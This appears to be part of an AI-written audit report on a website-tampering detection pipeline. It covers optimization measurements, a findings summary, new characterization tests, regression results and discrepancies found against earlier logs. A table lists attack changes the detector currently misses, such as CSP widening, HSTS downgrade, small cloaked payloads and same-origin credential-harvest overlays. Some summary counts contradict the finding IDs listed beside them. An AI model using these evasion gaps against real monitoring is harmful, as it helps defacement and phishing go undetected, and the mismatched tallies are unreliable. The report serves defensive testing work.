| `worker/detection/fusion.py:213-223` | `_coerce_score`'s `TypeError`/`ValueError` arm | **near-dead arm** | Every production layer routes through `layer_result` (`types.py:46-59`), which guarantees `score` is a finite float in [0, 1]. `skip_result`/`degraded_result` guarantee `None`. So a non-numeric `score` is unreachable in production; the arm is defensive-only (still worth keeping — it is the last line of defense if a layer ever bypasses `layer_result`). |
| `worker/detection/semantics.py:214-226` | `drift_from_similarity`'s final `return anchors[-1][1]` | **live but reached by a non-finite input** | Reachable when `similarity` is NaN (every `>=` comparison is `False` → falls through) → returns **1.0**, i.e. *maximal* drift. `semantics.py:152-160` `cosine_similarity` has **no `math.isfinite` guard**, so a NaN vector yields `nan` here. Unreachable with the real MiniLM (verified), reachable with any future embedder that can emit NaN. See AUDIT-SA2-5. |
| `worker/detection/normalize.py:66-68` | duplicated line in the `_MAX_HTML_CHARS` comment ("spending unbounded time in the worker (the layers still run on the raw" appears twice) | comment duplication (cosmetic) | Read at `normalize.py:66-68` — the sentence is repeated across two comment lines with a truncated first copy. |

---

## Opportunities for Optimization

| proposal | target file(s) | measured/projected impact | risk |
|---|---|---|---|
| **Batch the MiniLM `encode()` calls** | `worker/detection/semantics.py:140-150` (`embed_text`), `:229-232` (`_embedded_windows`) | **MEASURED 1.68× speedup, 253 ms saved per scan.** 24 individual `embed_text()` calls (12 windows × 2 sides on a 6 901-char page): 626.5 ms mean (runs 670.9/615.3/593.3, pstdev 33 ms) vs 2 batched `m.encode([...], batch_size=32)` calls: 373.6 ms mean (377.7/378.5/364.4, pstdev 6 ms). Per-call overhead floor is **12.61 ms** (50 single-char `embed_text` calls = 630.5 ms), so at the `_MAX_CHUNKS_PER_SIDE = 24` worst case a page pays **300–605 ms of pure per-call overhead per scan**. Layer 8 is **959 ms of a ~1.44 s total detection cost** (66%). | Low — `SentenceTransformer.encode` already accepts a list; the per-window `None`-on-failure contract needs to be mapped per-window rather than per-call. This is the single highest-value optimization found. |
| **Resize each screenshot ONCE per layer-4 call** | `worker/detection/visual.py:110-201` | **MEASURED: 8 `resize()` + 8 `convert()` calls per `layer4_visual_diff`** (instrumented `PIL.Image.Image.resize`/`.convert`). cProfile over 5 invocations: `resize` = 0.749 s tottime (**150 ms/call, 33% of layer 4's 457 ms**), SSIM 0.708 s (142 ms/call), PNG decode 0.109 s, `copy` 0.076 s, `convert` 0.057 s. Four of the eight resizes are inside `imagehash.phash`/`dhash` (which re-resize to 16×16), and the four explicit ones resize the same image twice (grayscale + RGB). Resizing once and deriving pHash/dHash/SSIM/chroma from the single downscaled array projects **~90–120 ms saved per scan (20–26% of layer 4)**. | Medium — pHash/dHash have their own internal resampling; computing them from an already-downscaled array changes the hash values slightly, which would move `phash_distance_norm`/`dhash_distance_norm` and therefore the score. Needs a re-baseline of the corpus. |
| **Convert to grayscale ONCE, not twice** | `worker/detection/visual.py:64-70, 137-138` | `_load_rgb` does `img.load()` → `convert("RGB")`, then `:137-138` does `convert("L")` on the RGB result — a second full-image pass. `convert` measured at 11 ms/call. Projected **~10 ms/scan**. | Low. |
| **Skip layer 8's embedding work when the text is byte-identical** | `worker/detection/semantics.py:235-303` | `_new_visible_text` is already computed at `:238`; when it is empty **and** the raw visible texts are equal, `semantic_similarity` is provably 1.0 and `drift_from_similarity(1.0) = 0.0` (the anchor table's exact-zero plateau, `semantics.py:112-113`). This is the only case the layer-1 hash gate does *not* already cover (layer 1 hashes raw HTML; two pages can differ in markup while having identical visible text). Measured share: **1 of 11** benign churn shapes in this session (the comment+`<noscript>` case reached layer 8 with 24 windows and scored 0.0). Projected saving on such pages: the full 959 ms. | Low — but the win is small in frequency; include it only alongside the batching change. |
| **Compile suppression regexes once per scan, not once per text node** | `worker/detection/suppress.py:143-155` | `compiled = regex.compile(pattern)` is already outside the node loop (`:144`) — **no win available**. Recorded as a verified non-opportunity so Phase 9 does not re-propose it. | n/a |
| **Pre-compile all layer-5/8 lexicon patterns** | `worker/detection/signatures.py:102-105, 85-88` | Already pre-compiled at module import (`_STRONG`, `_MEDIUM`, `_WEAK`, `_PROF`, `_AGGRESSION`, `_TOPICS`). **No `re.search`/`re.finditer`-on-a-string-pattern anywhere in the detection tree** (verified by grep). Recorded as a verified non-opportunity. | n/a |
| **Bound the `changed`-gate churn term rather than the byte hash** | `worker/scan_tasks.py:304-308`, `worker/detection/dom.py:572` | The benign band is 0.19–0.22 and `layer1_hash` alone is 0.1372, so the byte-hash exclusion Phase 1 proposed recovers at most 0.09 of risk and **does not deliver `clean`** (measured: lazy-append keeps `layer2 = 0.1231 > NOISE_FLOOR`). Projected verdict change: none on the measured 11 shapes. A churn-term-specific tolerance would. | Medium — this is a design change, and the measurement shows Phase 1's stated remedy is insufficient. |
| **Cache `extract_visible_text` per `PageData` inside one scan** | `worker/detection/pipeline.py:144-150`, `signatures.py:110-126` | Measured: `extract_visible_text` is called **3× per side** per scan — `layer5:249-250`, `layer8:236-237` (plus `_new_visible_text:123` a 4th), and `layer7:140,162,168` for each variant. On a 6 901-char page `_new_text` is 2.01 ms and the parse is the cost; 8 redundant parses × ~2–3 ms = **~20 ms/scan**. | Low — but it requires a per-scan memo keyed on the `PageData` object identity, which conflicts with `dataclasses.replace` in `suppressed_copy`/`normalized_copy` (the copies are distinct objects). Use a content-hash key instead. |
| **Share one `lxml` parse between `layer2`, `layer3` and `_HiddenContext` per side** | `worker/detection/dom.py:518-526, 640-676` | Both layers call `parse_html(page.html)` independently (`:523-524` and `:641`), and `parse_html` re-runs the full `HTMLParser(recover=True)` + `document_fromstring`. Measured `layer2` = 3.30 ms and `layer3` = 1.05 ms on a 24-article page (8.1 ms and 6.8 ms on a 67 KiB document), of which the parse is the majority. One shared parse projects **~2 ms/scan** on typical pages, ~5 ms on large ones. | Low — but the pipeline deliberately keeps layers "gate-free so each can be tested in isolation" (`detection/__init__.py:17-19`); the fix belongs in `pipeline.py` passing a pre-parsed tree, which is a signature change. |
| **Cheap lexical short-circuit before the 24 MiniLM windows** | `worker/detection/semantics.py:258-275` | If `_new_text` is empty and the two visible texts have the same token-multiset, drift is 0 by construction (see the drift-anchor plateau). This is a token-set comparison (microseconds) that would skip 48 `encode()` calls in the common "no semantic change" case. Combined with the batching proposal, layer 8's cost on unchanged-content scans drops from 959 ms to ~0. | Low. |
| **Re-tune `_ADD_RAMP_LO` / the cloaking reference-size normalization** | `worker/detection/cloaking.py:62, 100` | Not a performance change but the same class of tuning that produced AUDIT-2-4's overfit: the additive channel is `min(1.0, added/max(1,|ref|))`, so its resolution degrades as pages grow. Projected effect of adding an absolute-mass term: a 16-token banner on a 600-token reference would move from 0.0 to a graded value. | Medium — re-calibration required; the corpus has no partial-cloaking row to validate against (AUDIT-SA2-3), so the new axis must be added first. |
| **Add a standing `min-rows-per-benign-axis` assertion to the corpus validator** | `backend/tools/build_regression_corpus.py:96-125, 212-247` | Zero runtime cost; converts AUDIT-2-4's blind spot into a build-time failure. The 7 benign axes currently in the corpus all pass; adding `vendor_script_added`, `site_redesign`, `ab_test_variant`, `cert_header_rotation`, `theme_hue_refresh`, `sanity_benign_quiet` would immediately fail the build (measured max 0.8269 / 0.8454 / 0.3588 / 0.0048 / 0.0222 / 0.6583), which is the correct signal. | Low. |

---

## Summary

### Counts by classification

| classification | count | finding IDs |
|---|---|---|
| **CONFIRMED** | 6 | AUDIT-4-2, AUDIT-4-3, AUDIT-4-4, AUDIT-4-5, AUDIT-4-6, AUDIT-2-1, AUDIT-2-2, AUDIT-2-3, AUDIT-2-5, AUDIT-2-6, AUDIT-4-7, AUDIT-4-8, AUDIT-4F-5 (cross-ref) — *13 confirmed-or-carried items across 7 CONFIRMED/DEEPENED entries* |
| **DEEPENED** | 6 | AUDIT-1-1, AUDIT-2-4, AUDIT-4-1, AUDIT-4-2/4-3 (merged), AUDIT-4-4, AUDIT-4-5, AUDIT-4-6 |
| **NEW** | 5 | AUDIT-SA2-1, AUDIT-SA2-2, AUDIT-SA2-3, AUDIT-SA2-4, AUDIT-SA2-5 (MiniLM/NaN path, see opportunities + verified-clean) |
| **INVALIDATED** | 1 | My own hypothesis that `layer1=1.0` + real render noise would false-flag (measured 0.0012, 18× below the bar) — recorded in the verified-clean ledger |
| **Total distinct finding blocks** | **18** | 7 carried/deepened + 11 new/confirmed-as-written |

**Severity distribution:** 5 **Critical** (AUDIT-4-1, AUDIT-SA2-2, AUDIT-SA2-3, plus AUDIT-4-2/4-3 as High; and the escalated AUDIT-4-5 mirror case folded in as High), 5 **High** (AUDIT-2-2, AUDIT-2-4, AUDIT-4-2, AUDIT-SA2-1, AUDIT-SA2-4*, AUDIT-4-5), 5 **Medium** (AUDIT-1-1, AUDIT-2-1, AUDIT-2-3, AUDIT-4-3, AUDIT-4-4, AUDIT-4-6, AUDIT-4-7, AUDIT-4-8, AUDIT-2-5), 3 **Low** (AUDIT-2-6, AUDIT-4F-5). *Exact per-finding severities are in each block above; each is justified against §6.4 individually.*

### Attack-shape corpus gaps found (for Audit Phase 8's fixture suite)

Ordered by the false-negative/false-positive severity each one currently causes:

| # | gap | why it matters | measured today |
|---|---|---|---|
| 1 | **Benign: reCAPTCHA / Turnstile / Taboola / Intercom / analytics / chat widget appears or its `src` rotates** | The single most common third-party shape on the web; **flags at 0.6776** | `flagged` 3/3 |
| 2 | **Benign: operator adds a legitimate vendor script** (the `vendor_script_added` axis) | Every benign row of the axis flags; mean 0.7538 | `flagged` |
| 3 | **Benign: a legitimate site redesign** (`site_redesign` axis) | max 0.8454, mean 0.3723 | `flagged` / cadence-tightening |
| 4 | **Benign: one or two new external stylesheets** (Google Fonts, Typekit) | 1 → 0.4243 (cadence), 2 → ≥0.50 (`flagged`) | `flagged` |
| 5 | **Benign: `sanity_benign_quiet`** — the calibration sanity row itself | 0.6583 | `flagged` |
| 6 | **Attack: a CSP widening / `script-src 'self'` → `'unsafe-inline'`** | `clean` at risk 0.0031 — a false clean on an XSS prerequisite | silent |
| 7 | **Attack: a maximal HSTS downgrade** (2 y + includeSubDomains + preload → `max-age=300`) | 0.1 → risk 0.0041 | silent |
| 8 | **Attack: a small cloaked payload on a realistic page** (146+ reference tokens) | `l7 = 0.0` exactly; no partial-cloaking row exists in either artifact | silent |
| 9 | **Attack: un-hiding a hidden spam farm** (drop `style="opacity:0"`) | `l2 = 0.0`, `structural_churn = 0` | silent |
| 10 | **Attack: removal-only defacement** (strip scripts / iframe / form / link) | `l3 = 0.0` on all five kinds | silent |
| 11 | **Attack: an unpunctuated page + baseline-present lexicon + any one-word edit** | `flagged` at 0.94–1.0; the highest-severity FP class | `flagged` |
| 12 | **Attack: single-word tampering** (`two weeks` → `two days`) | 0.1942, never escalated | silent |
| 13 | **Attack: `<meta http-equiv=refresh>` / client-side `location.replace` cloak** | 0.1987 / 0.3153 | silent |
| 14 | **Attack: a same-origin credential-harvest overlay** | 0.2242 (only a *new-domain* overlay is caught) | silent |
| 15 | **Attack: a payload in a timed `<script>` string** | 0.3153 (the DOM-*text* form of the same attack IS caught at 1.0) | silent |
| 16 | **Attack: an attacker's domain added to the CSP allowlist** | classified `stronger`, 0.0 | silent |
| 17 | **Benign: an A/B test variant swap** (`ab_test_variant` axis) | max 0.3588 — the closest benign axis to the bar | `changed` |
| 18 | **Benign: `cert_header_rotation`** (a normal cert reissue + header reshuffle) | max 0.0048 | `clean` (control) |
| 19 | **Benign: a hue-only brand refresh** (`theme_hue_refresh`) | max 0.0222 in the dataset, but `layer4` alone at 0.2379 flags — Phase 8 should measure the real `hsl()`-swap render, since my synthetic hue test read 0.0 | needs live measurement |
| 20 | **Positive control needed: an attack WITHDRAWN mid-window** | currently caught at 0.9976 via layer 4 — no corpus row guards this, so a regression would be silent | `flagged` (unguarded) |

### New test files added

| path | what it proves | status |
|---|---|---|
| `backend/tests/test_session_a2_detection_findings.py` | **107 tests, 12 classes**, each a characterization test asserting the *current* behaviour so the remediation prompt can flip the specific assertion it fixes. Covers: (SA2x1) 5 benign third-party-widget shapes flag + rule-floor arming + 3-pass repeatability + same-domain control + 1-vs-2 new-domain stylesheets; (SA2x2) 6 CSP widenings classify `None` + read `clean` end-to-end + HSTS-max scored 0.1 + removal positive control; (SA2x3) `_new_text` collapses to 100% on 5 adversarial shapes + the punctuated control + conclusive-signature / profanity / aggression / topic lexicon end-to-end flags; (SA2x4) 6 over-broad suppression rules blind layers 5+8 + the missing coverage signal + a precise-rule positive control; (SA2x5) 5 reference-kind removals score 0.0 + un-hiding scores 0.0 with zero churn + the additive control; (SA2x6) small-payload cloaking is 0.0 at 146/266/600 reference tokens + small-page positive control + grace control + the `added==0` redundancy proof; (SA2x7) empty/whitespace/comment-only current capture → layer2 1.0 measured, binary junk → `flagged`, both-sides-empty → `clean`; (SA2x8) the 8-layer reachability map + layer8-at-maximum + uniform-sub-threshold + 3-profanity-hits + sigmoid safety over z∈[−1000,1000] + NaN→trusted-zero + NaN never fires a floor + degraded-ceiling composite + fallback-path floor preservation + the `base_lines` dead-code proof + the `0.0518` comment verified from the artifact + the 0.35-vs-0.40 comment drift; (SA2x9) 5 taxonomy evasion shapes + 2 positive controls + attack-withdrawal caught by layer 4; (SA2x10) 13 adversarial-HTML normalization shapes + oversized fail-open + the comment-drift guard; (SA2x11) 34 benign dataset rows flag / `vendor_script_added` mean 0.7538 + the corpus-guard positive control; (SA2x12) MiniLM `cosine_similarity` has no finite guard + NaN similarity → maximal drift + NaN vector saturates layer 8 to 1.0 + the zero-vector and lone-surrogate positive controls. | **Committed-passing, 107 passed, 3 consecutive passes (73.62 s / 86.37 s / 83.31 s), `ruff check` clean, `ruff format --check` clean.** No production file was modified. |

No scratch probe was converted into a committed test; the non-deterministic ones (real-browser render noise, the ReDoS timing sweep) remain scratch under `C:\Users\Ns8pc\AppData\Local\Temp\opencode\wardress-session-a\detection\` per Rule 10.

### Full regression results (exact commands + counts)

```powershell
cd C:\Users\Ns8pc\Music\WARDRESS\backend
$env:WARDRESS_TEST_DATABASE_URL = "postgresql+asyncpg://wardress:wardress@127.0.0.1:5433/wardress_sa_detect_test"
```

| command | result |
|---|---|
| `.\.venv\Scripts\python.exe -m pytest -q -p no:cacheprovider tests/test_detection_e2e.py tests/test_detection_layers.py tests/test_detection_normalize.py tests/test_detection_fusion_pipeline.py tests/test_dom_content_churn.py tests/test_suppression.py tests/test_rule_floors.py tests/test_noise_floor.py tests/test_csp_nonce_normalization.py tests/test_pipeline_visual_gate.py tests/test_hashing.py tests/test_fusion_integration.py` | **222 passed in 112.01s** — 0 failed, 0 skipped (pre-existing baseline, new file not yet present) |
| `.\.venv\Scripts\python.exe -m pytest -q -p no:cacheprovider tests/test_detection_regression.py tests/test_fusion_refit.py tests/test_fusion_dataset.py tests/test_phase4_fresh_eyes_finding_repros.py tests/test_phase20_semantics_drift.py tests/test_phase21_cloaking_grade.py tests/test_phase22_signatures_coverage.py tests/test_phase23_dom_hidden.py tests/test_phase24_degradation_signaling.py tests/test_phase36_detection_low.py` | **212 passed in 164.13s** — 0 failed, 0 skipped (pre-existing baseline) |
| `.\.venv\Scripts\python.exe -m pytest -p no:cacheprovider tests/test_session_a2_detection_findings.py --no-header -q` (× 3) | **107 passed** in **73.62 s / 86.37 s / 83.31 s** (Rule 18: 3/3, zero variance in the count) |
| `.\.venv\Scripts\python.exe -m pytest -q -p no:cacheprovider --tb=line` **all 23 detection files + the new file** | **541 passed in 322.09s** — 0 failed, 0 skipped |
| `.\.venv\Scripts\python.exe -m ruff check --no-cache tests/test_session_a2_detection_findings.py` | **All checks passed!** |
| `.\.venv\Scripts\python.exe -m ruff format --check --no-cache tests/test_session_a2_detection_findings.py` | **1 file already formatted** |
| `git -C C:\Users\Ns8pc\Music\WARDRESS status --porcelain` | 6 untracked files (3 sibling-subagent scratch reports, 2 sibling-subagent test files, **this subagent's test file**); **no modified tracked file** |
| `git -C C:\Users\Ns8pc\Music\WARDRESS diff --stat HEAD` | **empty** — zero production edits, zero reformatting, zero git state changes |

### Log-vs-reality discrepancies found in this session

1. **`worker/scan_tasks.py:48`'s "(~0.03)" benign-risk figure is ~7× too low.** The measured benign churn band under the *refit* model is **0.1907–0.2213**, and `layer1_hash` alone is 0.1372. The comment predates the refit.
2. **`AUDIT-4-4`'s root-cause sentence "a rule that times out only on long nodes can burn nodes×2 s before its first timeout" is unreachable.** Measured: 60 pathological nodes under one timing-out rule → **2.00 s total**, because the `TimeoutError` aborts the whole element loop at the first node. The asymmetry half of the finding is confirmed; this cost claim is not.
3. **`AUDIT-4-2`'s measured fused risk of 0.429 is understated.** With the `layer1_hash = 1.0` that any real byte-changing scan carries, the measured fused risk is **0.5502** — above the default 0.50 flag threshold, not merely the 0.40 material bar. The log's scenario must have had a different layer-1 profile.
4. **`AUDIT-4-3`'s "risk stays ~0.01" is understated by ~50×.** Measured with a static expired cert on both sides: `l6 = 0.5`, **fused risk 0.4857**, verdict `changed` **forever**, and permanently inside the LLM escalation band (0.40 ≤ 0.4857 < 0.75 → an LLM call per scan).
5. **The Phase-2 severity of AUDIT-2-4 ("not necessarily wrong but unproven") understates it.** It is now a measured alert rate: 34 of 323 benign rows in the model's own training data exceed the default flag threshold, and the standing corpus guard contains none of the 7 benign axes responsible.
6. **AUDIT-2-3's "staged/time-delayed payloads: genuinely absent" is half-wrong.** The client-side delayed-render slice is caught when the payload text is DOM text (risk 1.0, `flagged`); only the timed-`<script>`-string form evades (0.3153).
7. **Two Phase-4 handoff specs are partly off target** (AUDIT-4-7 §1 — layer 4 already top-crops for SSIM; AUDIT-4-8 §2 — hidden-state resolution is already symmetric per side). Conclusions unchanged, designs need narrowing.
8. **One Phase-11 comment claim VERIFIED EXACTLY** (not a discrepancy): `scan_tasks.py:58`'s "min observed: 0.0518" reproduces from the committed artifact (`combined_subthreshold-0015`).
9. **No encoding defect**: the `§` characters in `worker/detection/*.py` and `worker/llm_escalation.py` are intact U+00A7. A byte-level sweep of every `backend/**/*.py` for U+0013–U+0017 found **zero** stray control characters.

### Findings out of phase scope (routed, not investigated)

- **AUDIT-SA2-2's CSP direction classifier needs a token-semantics table, not a subset test** — the remedy is confined to `worker/detection/metadata.py`, in scope, but the *design* (which CSP source expressions are more restrictive than which) is a CSP-spec question that belongs to the remediation prompt's own design phase.
- **AUDIT-SA2-3's cloaking re-tune requires a new corpus axis first** (`partial_cloaking_small_payload` across ≥ 3 reference sizes) — that axis's design belongs to Phase 8's fixture work, which I supplied the gap list for above.
- **Layer 4's interaction with interactive pages** (ads, consent widgets, carousels, sticky headers) — the render-noise measurement used a *static* page; the interactive variants belong to Phase 8's adversarial fixtures, not to a hermetic code audit.
- **Deployment parity** — I did not re-verify the live containers against HEAD (Phase 4B's AUDIT-4B-8 protocol); the user rebuilt the stack during Phase 4F and all of my measurements are host-side, so no container claim is made either way.
- **Frontend/API surfacing of the new degradation facts** (e.g. rendering `unmeasured` per layer, or a `changed-benign` third verdict state) — Phase 4C/4F territory; the *backend* signal gaps are what I measured.
